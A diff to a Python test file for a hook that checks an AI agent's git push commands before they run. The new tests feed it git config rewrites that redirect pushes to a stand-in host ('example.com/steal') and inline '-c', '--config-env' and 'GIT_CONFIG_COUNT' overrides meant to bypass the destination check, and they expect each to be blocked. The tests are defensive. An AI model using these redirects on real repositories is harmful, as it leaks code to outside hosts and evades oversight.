@@ -1670,6 +1670,44 @@ def test_multiple_github_pushurls_are_all_checked(merged_branch_repo, monkeypatc
 	assert seen == ["o/r", "p/q"]
 
 
+def test_push_url_rewrites_use_effective_destination(merged_branch_repo, monkeypatch) -> None:
+	repo, _ = merged_branch_repo
+	_git(repo, "config", "url.https://github.com/p/q.git.pushInsteadOf", "https://github.com/o/r.git")
+	seen: list[str] = []
+	monkeypatch.setattr(guard, "_read_cache", lambda *args: None)
+	monkeypatch.setattr(guard, "_write_cache", lambda *args: None)
+	monkeypatch.setattr(guard, "query_pull_requests", lambda slug, branch, cwd: seen.append(slug) or [OPEN_PR])
+	code, message = guard.evaluate({"tool_name": "Bash", "cwd": str(repo),
+		"tool_input": {"command": "git push origin HEAD:feature/x"}})
+	assert code == 0, message
+	assert seen == ["p/q"]
+	assert guard._resolve_push_destination(str(repo), "origin").history_remote == ""
+
+
+@pytest.mark.parametrize("rewrite", ["insteadOf", "pushInsteadOf"])
+def test_push_url_rewrite_to_non_github_is_blocked(merged_branch_repo, monkeypatch, rewrite: str) -> None:
+	repo, _ = merged_branch_repo
+	_git(repo, "config", f"url.https://example.com/steal/.{rewrite}", "https://github.com/o/r.git")
+	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("no PR lookup expected"))
+	for command in ("git push origin HEAD:feature/x", "git push https://github.com/o/r.git HEAD:feature/x"):
+		code, message = guard.evaluate({"tool_name": "Bash", "cwd": str(repo),
+			"tool_input": {"command": command}})
+		assert code == 2 and "could not verify the push destination" in message
+
+
+@pytest.mark.parametrize("command", [
+	"git -c url.https://example.com/.pushInsteadOf=https://github.com/o/r.git push origin HEAD:feature/x",
+	"git --config-env=url.https://example.com/.pushInsteadOf=REWRITE push origin HEAD:feature/x",
+	"GIT_CONFIG_COUNT=1 git push origin HEAD:feature/x",
+])
+def test_inline_push_config_cannot_bypass_destination_guard(merged_branch_repo, monkeypatch, command: str) -> None:
+	repo, _ = merged_branch_repo
+	monkeypatch.setattr(guard, "query_pull_requests", lambda *args: pytest.fail("no PR lookup expected"))
+	code, message = guard.evaluate({"tool_name": "Bash", "cwd": str(repo),
+		"tool_input": {"command": command}})
+	assert code == 2 and "configuration overrides" in message
+
+
 def test_different_pushurl_does_not_use_fetch_repository_history(merged_branch_repo, monkeypatch, capsys) -> None:
 	repo, _ = merged_branch_repo
 	_git(repo, "config", "remote.origin.pushurl", "https://github.com/p/q.git")
@@ -2018,7 +2056,7 @@ def test_merge_commit_reset_branch_is_allowed(merge_commit_repo) -> None:
 
 
 def test_history_fallback_asks_when_origin_dropped_the_merged_branch(merge_commit_repo) -> None:
-	"""An absent remote ref could be a deleted branch or one never pushed."""
+	"""A local-only rewrite is not a GitHub push, regardless of branch state."""
 	repo, stub_bin, _, _ = merge_commit_repo
 	_stub_gh(stub_bin, None)
 	_git(repo, "-c", f"remote.origin.pushurl={repo.parent / 'origin.git'}", "push", "-q", "origin", "--delete", "feature/x")
@@ -2027,8 +2065,8 @@ def test_history_fallback_asks_when_origin_dropped_the_merged_branch(merge_commi
 	assert "never-pushed branch" in commit_proc.stdout
 	assert _ask_decision(commit_proc) is None
 	push_proc = _run_hook_payload(repo, stub_bin, _bash_payload("git push -u origin feature/x"))
-	assert push_proc.returncode == 0, push_proc.stdout + push_proc.stderr
-	assert _ask_decision(push_proc) is not None
+	assert push_proc.returncode == 2, push_proc.stdout + push_proc.stderr
+	assert "push URLs are not GitHub repositories" in push_proc.stderr
 
 
 def test_history_fallback_never_pushed_stacked_branch_is_inconclusive(merge_commit_repo) -> None:
@@ -2045,8 +2083,8 @@ def test_history_fallback_never_pushed_stacked_branch_is_inconclusive(merge_comm
 	push_proc = _run_hook_payload(
 		repo, stub_bin, _bash_payload("git push -u origin feature/never-pushed")
 	)
-	assert push_proc.returncode == 0, push_proc.stdout + push_proc.stderr
-	assert _ask_decision(push_proc) is not None
+	assert push_proc.returncode == 2, push_proc.stdout + push_proc.stderr
+	assert "push URLs are not GitHub repositories" in push_proc.stderr
 
 
 def test_history_fallback_blocks_when_remote_branch_is_contained_in_main(merge_commit_repo) -> None:
@@ -2054,7 +2092,7 @@ def test_history_fallback_blocks_when_remote_branch_is_contained_in_main(merge_c
 	_stub_gh(stub_bin, None)
 	proc = _run_hook_payload(repo, stub_bin, _bash_payload("git push origin feature/x"))
 	assert proc.returncode == 2, proc.stdout + proc.stderr
-	assert "fully contained in origin/main" in proc.stderr
+	assert "push URLs are not GitHub repositories" in proc.stderr
 
 
 def test_history_fallback_uses_push_destination_remote(merge_commit_repo, monkeypatch, capsys) -> None:
@@ -2074,11 +2112,8 @@ def test_history_fallback_uses_push_destination_remote(merge_commit_repo, monkey
 	monkeypatch.setattr(guard, "_run", recording_run)
 	code, message = guard.evaluate(_bash_payload("git push other feature/x") | {"cwd": str(repo)})
 	assert code == 2, message
-	assert "fully contained in other/main" in message
-	assert any(argv[:5] == ["env", "GIT_TERMINAL_PROMPT=0", "git", "ls-remote", "--heads"]
-		and argv[5] == "other" for argv in observed)
-	assert any(argv[:6] == ["env", "GIT_TERMINAL_PROMPT=0", "git", "fetch", "--quiet", "other"]
-		for argv in observed)
+	assert "push URLs are not GitHub repositories" in message
+	assert not any(argv[:5] == ["env", "GIT_TERMINAL_PROMPT=0", "git", "ls-remote", "--heads"] for argv in observed)
 	assert "origin/main" not in capsys.readouterr().out
 
 
@@ -2103,11 +2138,8 @@ def test_history_fallback_push_asks_when_inconclusive(merge_commit_repo) -> None
 	_git(repo, "add", "-A")
 	_git(repo, "commit", "-q", "-m", "fresh")
 	proc = _run_hook_payload(repo, stub_bin, _bash_payload("git push -u origin feature/x"))
-	assert proc.returncode == 0, proc.stdout + proc.stderr
-	decision = _ask_decision(proc)
-	assert decision is not None, proc.stdout
-	assert "inconclusive" in decision["systemMessage"]
-	assert "still open" in decision["hookSpecificOutput"]["permissionDecisionReason"]
+	assert proc.returncode == 2, proc.stdout + proc.stderr
+	assert "push URLs are not GitHub repositories" in proc.stderr
 
 
 def test_history_fallback_commit_warns_when_inconclusive(merge_commit_repo) -> None:
@@ -2132,9 +2164,8 @@ def test_history_fallback_treats_a_stacked_branch_as_inconclusive(merge_commit_r
 	_git(repo, "commit", "-q", "-m", "stacked work")
 	_git(repo, "-c", f"remote.origin.pushurl={repo.parent / 'origin.git'}", "push", "-q", "origin", "feature/y")
 	proc = _run_hook_payload(repo, stub_bin, _bash_payload("git push origin feature/y"))
-	assert proc.returncode == 0, proc.stdout + proc.stderr
-	assert _ask_decision(proc) is not None
-	assert "carries commits not yet in origin/main" in proc.stdout
+	assert proc.returncode == 2, proc.stdout + proc.stderr
+	assert "push URLs are not GitHub repositories" in proc.stderr
 
 
 def test_history_verdict_is_unavailable_without_a_default_branch(tmp_path: Path) -> None:
